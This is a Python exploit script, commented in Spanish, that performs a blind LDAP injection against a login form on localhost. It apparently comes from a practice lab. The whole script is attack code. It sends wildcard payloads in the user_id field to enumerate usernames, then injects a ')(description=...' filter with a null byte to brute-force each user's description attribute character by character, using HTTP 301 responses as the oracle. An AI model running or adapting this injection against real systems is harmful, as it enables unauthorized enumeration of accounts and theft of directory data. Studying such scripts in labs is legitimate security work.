#!/usr/bin/python3

import requests
import time
import sys
import signal
import string

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

    # Variables globales
main_url = "http://localhost:8888/"

# Sirve para depurar, si el Proxy del Burpsuite está On, se capturará la request
burp = {'http' : 'http://127.0.0.1:8080'}

characters = string.ascii_lowercase + string.digits + ' '

# Es imprescindible tener en cuenta esta cabecera ya que de lo contrario, nos da SIEMPRE códigos de estado 200
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# Función que captura la inicial de cada usuario
def getInitialUsers():

    initial_users = []

    for character in characters:

        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)

        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False, proxies=burp)

        if r.status_code == 301:
            initial_users.append(character)

    return initial_users

def getUsers(initial_users):

    valid_users = []

    for first_character in initial_users:
            user = first_character

            # Da por hecho que ningún usuario tiene más de 15 caracteres
            for position in range(0, 15):

                for character in characters:
                    post_data = "user_id={}{}*&password=*&login=1&submit=Submit".format(user, character)

                    r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

                    if r.status_code == 301:
                        user += character
                        break

            valid_users.append(user)

    print("\n")

    for user in valid_users:
        log.info("Usuario válido encontrado: %s" % user)

    print("\n")

    return valid_users

# Se obtiene la descripción de un usuario en específico. En este caso, será el segundo usuario del array
def getDescription(user):

    description = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta para obtener la descripción del usuario %s" %user)

    time.sleep(2)

    p2 = log.progress("Descripción")

    for position in range(0,50):
        for character in characters:

            post_data = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit".format(user, description, character)

            r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

            if r.status_code == 301:
                description += character
                p2.status(description)
                break

    p1.success("Proceso de fuerza bruta concluido")
    p2.success("La descripción del usuario es: %s" % description)
    print("\n")


if __name__ == '__main__':

    users= getUsers(getInitialUsers())

    for i in range(0, len(users)):
        getDescription(users[i])
